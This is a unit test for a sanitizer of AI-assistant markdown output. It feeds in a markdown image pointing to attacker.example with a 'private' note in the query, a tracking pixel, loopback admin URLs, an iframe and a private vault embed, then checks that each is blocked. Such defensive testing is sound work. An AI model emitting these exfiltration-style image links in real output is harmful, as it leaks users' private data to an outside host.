import assert from "node:assert/strict";
import test from "node:test";

import { sanitizeAssistantMarkdownPresentationV1 } from "../src/ui/safeAssistantMarkdown";

test("assistant presentation blocks active remote, loopback, HTML, and vault embeds", () => {
  const safe = sanitizeAssistantMarkdownPresentationV1([
    "# Result",
    "![remote](https://attacker.example/collect?note=private)",
    "![loopback](http://127.0.0.1:3000/admin)",
    "![[Private/Secrets.md]]",
    '<iframe src="http://127.0.0.1:3000/private"></iframe>',
    "<img src='https://attacker.example/pixel'>",
  ].join("\n"));

  assert.doesNotMatch(safe, /!\[|!\[\[|<iframe|<img/iu);
  assert.match(safe, /Image blocked: remote/u);
  assert.match(safe, /Image blocked: loopback/u);
  assert.match(safe, /Vault embed blocked: Private\/Secrets\.md/u);
  assert.match(safe, /HTML blocked/u);
});
